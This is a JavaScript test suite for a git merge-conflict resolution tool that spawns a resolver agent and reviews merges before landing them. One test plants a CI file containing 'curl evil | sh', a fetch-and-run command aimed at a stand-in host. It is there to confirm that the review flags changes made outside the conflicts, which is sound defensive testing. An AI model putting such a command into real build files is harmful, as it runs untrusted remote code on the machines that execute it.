import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { createHarness, makeFannedOutRun, commitIn } from "./harness.mjs";
import { HarvestRenderer, renderHarvest } from "../bin/renderer-harvest.mjs";

const h = createHarness();
h.writeHerdrStub();
h.writeStub("claude", "exit 0");

const EC = { DRIFT: 30, LOCUS: 32, CONFLICT: 33, REFUSED: 36 };

// The resolver's split pane (w9:p7 / term_split7) is present in its workspace
// and led by claude: provably live.
const LIVE = { STUB_PANE_LIST_ALSO: "w9:p7", STUB_PANE_FG: "busy", STUB_FG_ARGV: '["claude"]' };

// A run whose slot 1 conflicts with base in the plugin-owned DETACHED merge
// tree (base is not checked out anywhere), exactly as harvest leaves it.
function conflicted(env = {}) {
	const run = makeFannedOutRun(h, { prefix: "rv" });
	Object.assign(run.env, env);
	const slotTip = commitIn(run.wt(1), "README.md", "slot version\n", "slot edit");
	const base = commitIn(run.repo, "README.md", "base version\n", "base edit");
	h.git(run.repo, "checkout", "-q", "-b", "elsewhere");
	const step = (verb, args = [], extra = {}) => h.runScript("harvest-step.sh", [verb, ...args.map(String)], { ...run.env, ...extra });
	const m = step("merge", [1, base]);
	assert.equal(m.status, EC.CONFLICT, `${m.stdout}\n${m.stderr}`);
	const tree = /merge_tree\t(.*)/.exec(m.stdout)[1];
	const git = (...args) => spawnSync("git", ["-C", tree, ...args], { encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
	const resolveByHand = (extra = () => {}) => {
		fs.writeFileSync(path.join(tree, "README.md"), "slot version\nbase version\n");
		git("add", "README.md");
		extra();
		assert.equal(git("commit", "-q", "--no-edit").status, 0);
		return git("rev-parse", "HEAD").stdout.trim();
	};
	return { ...run, base, slotTip, tree, step, git, resolveByHand };
}

const mainSha = (run) => h.git(run.repo, "rev-parse", "refs/heads/main").stdout.trim();
const lines = (r, key) => r.stdout.split("\n").filter((l) => l.startsWith(`${key}\t`)).map((l) => l.split("\t").slice(1));

test("the merged slot tip is journaled when a merge stops on conflicts", () => {
	const run = conflicted();
	assert.equal(run.slotRow(1).journal.merge_tip, run.slotTip);
});

test("conclude: a read-only review first; apply records exactly the reviewed commit; resume lands it", () => {
	const run = conflicted();
	let r = run.step("conclude", [1]);
	assert.equal(r.status, EC.REFUSED);
	assert.match(r.stderr, /still has conflicted files/);
	fs.writeFileSync(path.join(run.tree, "README.md"), "both\n");
	run.git("add", "README.md");
	r = run.step("conclude", [1]);
	assert.match(r.stderr, /resolved but the merge is not committed/);
	run.git("checkout", "-q", "--", "README.md");
	const sha = run.resolveByHand();
	r = run.step("conclude", [1]);
	assert.equal(r.status, 0, r.stderr);
	assert.deepEqual(lines(r, "conclude_ready"), [["1", sha]]);
	assert.deepEqual(lines(r, "outside_conflict"), [], "only the conflicted file differs from git's own merge");
	assert.match(r.stdout, /^stat\t README\.md \| /m);
	assert.equal(run.slotRow(1).journal.merge_commit_sha, null, "the review records nothing");
	r = run.step("conclude", [1, "apply", sha]);
	assert.equal(r.status, 0, r.stderr);
	assert.deepEqual(lines(r, "concluded"), [["1", sha]]);
	assert.equal(run.slotRow(1).journal.merge_commit_sha, sha);
	assert.equal(run.slotRow(1).journal.merge_tip, run.slotTip, "the pin survives the apply");
	assert.equal(mainSha(run), run.base, "concluding moves nothing");
	r = run.step("resume", ["complete", 1]);
	assert.equal(r.status, 0, r.stderr);
	assert.equal(mainSha(run), sha);
	assert.equal(fs.existsSync(run.tree), false);
});

test("an 'evil merge' — a resolution touching files outside the conflicts — is named in the review", () => {
	const run = conflicted();
	// The resolution commits a file neither side touched: git's own merge of
	// the same two commits does not contain it.
	const sha = run.resolveByHand(() => {
		fs.writeFileSync(path.join(run.tree, "ci.yml"), "curl evil | sh\n");
		run.git("add", "ci.yml");
	});
	const r = run.step("conclude", [1]);
	assert.equal(r.status, 0, r.stderr);
	assert.deepEqual(lines(r, "outside_conflict"), [["ci.yml"]]);
	const screen = renderHarvest({ rows: [], phase: { name: "conclude-confirm", slot: 1, sha, stat: [], outside: ["ci.yml"] } }, 120);
	assert.match(screen, /CHANGED OUTSIDE THE CONFLICTS \(1\)/);
	assert.match(screen, /ci\.yml/);
});

test("the review lists every changed file or says how many it left out — never a silent tail", () => {
	const stat = [...Array.from({ length: 30 }, (_, i) => ` f${String(i).padStart(2, "0")}.js | 1 +`), " 30 files changed, 30 insertions(+)"];
	const screen = renderHarvest({ rows: [], phase: { name: "conclude-confirm", slot: 1, sha: "a".repeat(40), stat, outside: [] } }, 120);
	assert.match(screen, /f00\.js/, "the head of the list is shown");
	assert.match(screen, /… and 10 more files/);
	assert.match(screen, /30 files changed/);
});

test("conclude refuses anything but one finished merge of the journaled slot tip onto the journaled base", () => {
	{
		const run = conflicted();
		run.resolveByHand();
		fs.writeFileSync(path.join(run.tree, "extra.txt"), "rides along\n");
		const r = run.step("conclude", [1]);
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /uncommitted changes beyond the merge commit/);
	}
	{
		const run = conflicted();
		run.git("merge", "--abort");
		fs.writeFileSync(path.join(run.tree, "README.md"), "hand-written\n");
		run.git("commit", "-q", "-am", "not a merge");
		const r = run.step("conclude", [1]);
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /not a two-parent merge commit/);
	}
	{
		// The slot's agent commits again after the merge started; the merge is
		// redone against the NEWER tip. That tip was never compared: refused.
		const run = conflicted();
		const newer = commitIn(run.wt(1), "late.txt", "late\n", "late slot commit");
		run.git("merge", "--abort");
		run.git("merge", "-q", "--no-ff", "--no-edit", newer);
		fs.writeFileSync(path.join(run.tree, "README.md"), "both\n");
		run.git("add", "README.md");
		assert.equal(run.git("commit", "-q", "--no-edit").status, 0);
		const r = run.step("conclude", [1]);
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, new RegExp(`second parent ${newer} is not the merged slot tip ${run.slotTip}`));
	}
	{
		// HEAD moved off the journaled base entirely.
		const run = conflicted();
		run.git("merge", "--abort");
		run.git("checkout", "-q", "--detach", run.slotTip);
		fs.writeFileSync(path.join(run.tree, "README.md"), "elsewhere\n");
		run.git("commit", "-q", "-am", "off base");
		const r = run.step("conclude", [1]);
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /HEAD moved off the journaled base/);
	}
	{
		// apply only ever records the commit that was reviewed.
		const run = conflicted();
		const reviewed = run.resolveByHand();
		assert.equal(run.step("conclude", [1]).status, 0);
		fs.writeFileSync(path.join(run.tree, "README.md"), "changed after review\n");
		run.git("commit", "-q", "--amend", "-a", "--no-edit");
		const r = run.step("conclude", [1, "apply", reviewed]);
		assert.equal(r.status, EC.DRIFT);
		assert.match(r.stderr, /not the reviewed/);
		assert.equal(run.slotRow(1).journal.merge_commit_sha, null);
	}
	{
		// A journal from before merge_tip existed cannot be concluded.
		const run = conflicted();
		run.resolveByHand();
		const file = path.join(run.sdir, "run-w9.json");
		const doc = JSON.parse(fs.readFileSync(file, "utf8"));
		delete doc.slots[0].journal.merge_tip;
		fs.writeFileSync(file, JSON.stringify(doc, null, 2));
		const r = run.step("conclude", [1]);
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /journaled before the merged tip was recorded/);
	}
});

test("a recorded-but-unlanded merge can be re-reviewed after an amend (no deadlock)", () => {
	const run = conflicted();
	const first = run.resolveByHand();
	assert.equal(run.step("conclude", [1, "apply", first]).status, 0);
	fs.writeFileSync(path.join(run.tree, "README.md"), "better resolution\n");
	run.git("commit", "-q", "--amend", "-a", "--no-edit");
	const amended = run.git("rev-parse", "HEAD").stdout.trim();
	const r = run.step("conclude", [1]);
	assert.equal(r.status, 0, r.stderr);
	assert.deepEqual(lines(r, "conclude_ready"), [["1", amended]]);
	assert.equal(run.step("conclude", [1, "apply", amended]).status, 0);
	assert.equal(run.step("resume", ["complete", 1]).status, 0);
	assert.equal(mainSha(run), amended);
});

test("a conflict in YOUR checked-out branch is never handed over or concluded by Swarm", () => {
	const run = makeFannedOutRun(h, { prefix: "rv" });
	commitIn(run.wt(1), "README.md", "slot version\n", "slot edit");
	const base = commitIn(run.repo, "README.md", "base version\n", "base edit");
	const m = h.runScript("harvest-step.sh", ["merge", "1", base], run.env);
	assert.equal(m.status, EC.CONFLICT, m.stderr);
	for (const verb of ["resolve", "conclude"]) {
		const r = h.runScript("harvest-step.sh", [verb, "1"], { ...run.env, STUB_HERDR_VERSION: "0.8.2" });
		assert.equal(r.status, EC.LOCUS, `${verb}: ${r.stderr}`);
		assert.match(r.stderr, /conflicted in YOUR checked-out branch/);
	}
	h.git(run.repo, "merge", "--abort");
});

test("resolve starts an agent beside the slot, in the merge tree, with a brief", () => {
	const run = conflicted({ STUB_HERDR_VERSION: "0.8.2" });
	fs.writeFileSync(h.logFile, "");
	const r = run.step("resolve", [1], { HERDR_SWARM_RESOLVER_PRESET: "claude" });
	assert.equal(r.status, 0, r.stderr);
	assert.match(r.stdout, /^resolver_started\t1\tw9:p7$/m);
	const log = h.log();
	assert.match(log, new RegExp(`pane split w11:p1 --direction down --cwd ${run.tree} --no-focus --env HERDR_SWARM_RUN_ID=${run.runId} --env HERDR_SWARM_SLOT=1`));
	assert.match(log, /pane run w9:p7 claude/);
	const brief = fs.readFileSync(path.join(run.tree, ".swarm-task.md"), "utf8");
	assert.match(brief, /- README\.md/);
	assert.match(brief, new RegExp(`merge of \`swarm/${run.runId}/s1\``));
	assert.match(brief, /exactly ONE `git commit --no-edit`/);
	assert.doesNotMatch(brief, /\{\{/, "every placeholder filled");
	assert.equal(run.git("status", "--porcelain").stdout.includes(".swarm-task.md"), false);
	const row = run.slotRow(1);
	assert.deepEqual([row.resolver.pane_id, row.resolver.terminal_id, row.resolver.workspace_id, row.resolver.agent_command], ["w9:p7", "term_split7", "w9", "claude"]);
	assert.equal(row.resolver.generation, row.journal.resource.generation);
	assert.equal(mainSha(run), run.base, "resolve merges nothing");
});

test("resolve refusals: old herdr, nothing left to resolve, unusable preset, no merge in flight", () => {
	{
		const run = conflicted({ STUB_HERDR_VERSION: "0.7.4" });
		const r = run.step("resolve", [1], { HERDR_SWARM_RESOLVER_PRESET: "claude" });
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /needs Herdr 0\.7\.5 or newer/);
	}
	{
		const run = conflicted({ STUB_HERDR_VERSION: "0.8.2" });
		const r = run.step("resolve", [1], { HERDR_SWARM_RESOLVER_PRESET: "no-such-preset" });
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /resolver preset 'no-such-preset' is unusable/);
		fs.writeFileSync(path.join(run.tree, "README.md"), "both\n");
		run.git("add", "README.md");
		const done = run.step("resolve", [1], { HERDR_SWARM_RESOLVER_PRESET: "claude" });
		assert.equal(done.status, EC.REFUSED);
		assert.match(done.stderr, /no conflicted files left/);
	}
	{
		const run = makeFannedOutRun(h, { prefix: "rv" });
		const r = h.runScript("harvest-step.sh", ["resolve", "1"], { ...run.env, STUB_HERDR_VERSION: "0.8.2" });
		assert.equal(r.status, EC.REFUSED);
		assert.match(r.stderr, /no merge in flight/);
	}
});

test("a resolver that may still be working keeps its tree: live AND unknown both block", () => {
	const run = conflicted({ STUB_HERDR_VERSION: "0.8.2", HERDR_SWARM_RESOLVER_PRESET: "claude", ...LIVE });
	assert.equal(run.step("resolve", [1]).status, 0);
	fs.writeFileSync(path.join(run.tree, "README.md"), "both\n");
	run.git("add", "README.md"); // staged: no unmerged paths left, merge not committed
	for (const [env, state] of [
		[{}, "live"],
		[{ STUB_FG_ARGV: '["node","/opt/claude-code/cli.js"]' }, "unknown"], // an interpreter name it cannot match
		[{ STUB_PANE_FG: "" }, "unknown"], // no process-info
	]) {
		assert.equal(run.step("resolve", [1], env).status, EC.REFUSED, state);
		const r = run.step("abort-merge", [1], env);
		assert.equal(r.status, EC.REFUSED, state);
		assert.match(r.stderr, new RegExp(`conflict resolver is ${state}`));
		const a = h.runScript("abort.sh", [], { ...run.env, ...env });
		assert.match(a.stderr, new RegExp(`conflict RESOLVER is ${state}`));
		assert.ok(fs.existsSync(run.tree), `kept while ${state}`);
	}
	assert.equal(fs.readFileSync(path.join(run.tree, "README.md"), "utf8"), "both\n", "the resolver's work is intact");
	run.git("commit", "-q", "--no-edit");
	const c = run.step("conclude", [1]);
	assert.equal(c.status, EC.REFUSED);
	assert.match(c.stderr, /conflict resolver is live — exit the agent/);
});

test("only positive evidence makes a resolver 'gone': its pane left the workspace, a bare shell, or the operator says so", () => {
	for (const env of [
		{ STUB_PANE_LIST_ALSO: "" }, // pane no longer listed in its workspace
		{ STUB_PANE_FG: "shell" }, // agent exited, the shell is back
		{ STUB_PANE_FG: "", HERDR_SWARM_RESOLVER_STOPPED: "yes" }, // explicit operator statement
	]) {
		const run = conflicted({ STUB_HERDR_VERSION: "0.8.2", HERDR_SWARM_RESOLVER_PRESET: "claude", ...LIVE });
		assert.equal(run.step("resolve", [1]).status, 0);
		const r = run.step("abort-merge", [1], env);
		assert.equal(r.status, 0, `${JSON.stringify(env)}: ${r.stderr}`);
		assert.equal(fs.existsSync(run.tree), false);
	}
});

test("a resolver record from an earlier merge attempt is inert", () => {
	const run = conflicted({ STUB_HERDR_VERSION: "0.8.2", ...LIVE });
	const file = path.join(run.sdir, "run-w9.json");
	const doc = JSON.parse(fs.readFileSync(file, "utf8"));
	doc.slots[0].resolver = { pane_id: "w9:p7", terminal_id: "term_split7", workspace_id: "w9", agent_command: "claude", generation: "an-older-attempt" };
	fs.writeFileSync(file, JSON.stringify(doc, null, 2));
	assert.equal(run.step("abort-merge", [1]).status, 0, "not treated as live");
});

test("harvest pane: g hands the conflict over, c reviews (records nothing), y records and lands", async () => {
	const run = conflicted({ STUB_HERDR_VERSION: "0.8.2", HERDR_SWARM_RESOLVER_PRESET: "claude" });
	const r = new HarvestRenderer(run.env);
	r.write = () => {};
	r.paint = () => {};
	await r.refresh();
	r.phase = { name: "conflict", slot: 1, kind: "conflict", files: ["README.md"], tree: run.tree };
	await r.onKey("g");
	assert.match(r.banner, /resolver started beside the slot's agent/);
	await r.onKey("c");
	assert.equal(r.phase.name, "conflict", "not concluded while conflicted");
	assert.match(r.banner, /still has conflicted files/);
	const sha = run.resolveByHand(); // what the resolver agent would do; its pane is gone in this stub
	await r.onKey("c");
	assert.equal(r.phase.name, "conclude-confirm");
	assert.match(renderHarvest({ rows: [], phase: r.phase }, 120), new RegExp(`LAND slot 1's resolved merge ${sha.slice(0, 12)}`));
	assert.match(renderHarvest({ rows: [], phase: r.phase }, 120), /Only the conflicted files differ from git's own merge/);
	assert.equal(run.slotRow(1).journal.merge_commit_sha, null, "reviewing records nothing");
	await r.onKey("n");
	assert.equal(run.slotRow(1).journal.merge_commit_sha, null, "declining records nothing");
	assert.equal(mainSha(run), run.base);
	r.phase = { name: "conflict", slot: 1, kind: "conflict", files: [], tree: run.tree };
	await r.onKey("c");
	await r.onKey("y");
	assert.equal(mainSha(run), sha);
	assert.match(r.banner, /merge landed/);
});
